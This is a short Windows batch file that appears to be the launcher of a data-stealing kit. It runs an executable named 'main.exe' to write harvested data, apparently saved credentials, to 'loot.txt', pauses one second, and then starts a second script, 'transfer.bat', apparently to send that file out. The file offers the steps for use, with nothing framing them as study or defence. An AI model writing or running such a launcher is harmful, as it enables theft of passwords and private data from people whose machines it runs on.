@echo off

start main.exe /stext loot.txt
timeout /t 1 /nobreak
start transfer.bat